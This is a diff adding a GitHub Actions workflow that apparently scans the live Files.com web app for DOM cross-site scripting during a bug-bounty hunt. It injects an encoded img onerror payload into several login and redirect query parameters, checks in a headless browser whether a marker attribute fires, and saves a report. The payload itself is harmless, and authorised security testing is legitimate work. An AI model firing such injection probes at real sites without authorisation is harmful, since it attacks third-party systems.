@@ -1,0 +1,62 @@
+name: Files.com Fast Browser Injection Probe
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - ".github/workflows/files-browser-xss-fast.yml"
+
+permissions:
+  contents: read
+
+jobs:
+  xss:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install browser
+        run: |
+          npm install -g agent-browser
+          agent-browser install
+      - name: Run focused DOM injection checks
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p browser-fast
+          payload='<img src=x onerror="document.documentElement.setAttribute('''data-h1xss''','''1''')">'
+          enc=$(python -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$payload")
+          : > browser-fast/results.txt
+          findings=0
+          for url in             "https://app.files.com/?q=$enc"             "https://app.files.com/?next=$enc"             "https://app.files.com/?redirect=$enc"             "https://app.files.com/login?q=$enc"             "https://app.files.com/login?next=$enc"             "https://app.files.com/login?redirect=$enc"             "https://app.files.com/login_from_oauth?redirect_uri=$enc"             "https://app.files.com/login_from_oauth?next=$enc"
+          do
+            agent-browser open "$url" >/dev/null
+            agent-browser wait 1500 >/dev/null 2>&1 || true
+            marker=$(agent-browser eval "document.documentElement.getAttribute('data-h1xss')" 2>/dev/null || true)
+            title=$(agent-browser get title 2>/dev/null || true)
+            current=$(agent-browser get url 2>/dev/null || true)
+            printf '%s\t%s\t%s\t%s\n' "$url" "$marker" "$title" "$current" | tee -a browser-fast/results.txt
+            if [[ "$marker" == "1" ]]; then
+              findings=$((findings+1))
+              printf 'FINDING\t%s\n' "$url" | tee -a browser-fast/results.txt
+            fi
+          done
+          agent-browser close >/dev/null 2>&1 || true
+          if [[ "$findings" -gt 0 ]]; then
+            cat > browser-fast/report.md <<'EOF'
+          # Potential DOM XSS candidate
+          
+          The browser executed the controlled marker payload on an in-scope Files.com page. This is a candidate pending exact manual reproduction, policy validation, and duplicate screening.
+          EOF
+          else
+            cat > browser-fast/report.md <<'EOF'
+          # NO VERIFIED BROWSER INJECTION FINDING
+          
+          None of the focused query-parameter variants executed the controlled browser marker.
+          EOF
+          fi
+      - name: Upload browser results
+        uses: actions/upload-artifact@v4
+        with:
+          name: files-browser-fast-evidence
+          path: browser-fast
